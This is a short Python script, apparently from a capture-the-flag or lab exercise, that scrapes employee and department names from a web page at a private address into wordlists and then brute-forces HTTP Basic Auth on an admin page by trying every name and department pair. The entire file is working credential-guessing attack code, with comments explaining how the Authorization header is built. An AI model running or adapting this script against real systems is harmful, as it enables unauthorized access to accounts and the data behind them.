import requests
from bs4 import BeautifulSoup
import base64

def generateWordlists():
    # temp, just to grab all the department and employee names
    # there are duplicate depts, used ``sort <file>.txt | uniq - <file2>.txt``
    req = requests.get("http://172.16.120.120/")
    scr = BeautifulSoup(req.content, "html.parser")

    depts = scr.find_all(id="department")
    names = scr.find_all(id="name")

    with open("pw.txt", "w+") as pws:
        for tag in depts:
            pws.write(tag.get_text() + "\n")

    with open("user.txt", "w+") as user:
        for tag in names:
            user.write(tag.get_text() + "\n")

def bruteforce():
    users = []
    pw = []
    with open("user.txt") as userlist:
        for user in userlist:
            users.append(user.strip()) # strip() removes the \n on the wordlists
            
    with open("pw.txt") as deptlist:
        for dept in deptlist:
            pw.append(dept.strip())

    # site uses Basic Auth, so it will send a packet with header "Authorization" with a Base64 encoded
    # payload. The payload is in the format "username:password" then Base64'd 
    for i in users:
        for j in pw:
            creds = i + ":" + j                                     
            creds = base64.b64encode(creds.encode("utf-8"))         # converts to Base64 string
            payload = "Basic " + str(creds, "utf-8")                # makes the payload string

            # manually writes in the headers
            req = requests.get("http://172.16.120.120/admin.php", headers={'Authorization': payload})

            # another way, auth={} will automatically do the formatting
            #req = requests.get("http://172.16.120.120/admin.php", auth=(i,j))
            
            # if status code is 401, it's unauthorized. code 200 is successful. 
            print("Testing creds: " + i + ":" + j + " Status: " + str(req.status_code))

